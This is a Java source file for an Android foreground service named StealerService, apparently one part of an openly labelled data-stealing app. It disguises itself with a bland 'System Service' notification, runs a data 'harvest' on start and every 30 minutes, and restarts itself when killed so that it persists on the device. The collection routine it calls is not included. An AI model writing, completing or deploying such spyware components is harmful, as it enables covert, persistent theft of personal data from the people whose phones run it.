// lang: Java, file: StealerService.java, target: Android 8+ API 26
// foreground service — runs always, harvests on start + periodic schedule

package com.example.zeca.stealer;

import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.os.*;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import java.util.concurrent.*;

public class StealerService extends Service {

    private static final String CH_ID = "sys_ch";
    private ScheduledExecutorService scheduler;

    @Override
    public int onStartCommand(Intent intent, int flags, int id) {
        createNotificationChannel();
        Notification notif = new NotificationCompat.Builder(this, CH_ID)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
        startForeground(1, notif);

        // initial harvest on first start
        DataCollector.harvest(this);

        // re-harvest every 30 minutes
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(
            () -> DataCollector.harvest(this),
            30, 30, TimeUnit.MINUTES
        );

        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CH_ID, "Service", NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
    }

    @Override
    public void onDestroy() {
        if (scheduler != null) scheduler.shutdownNow();
        // restart self on kill
        Intent i = new Intent(this, StealerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i);
        else startService(i);
    }

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }
}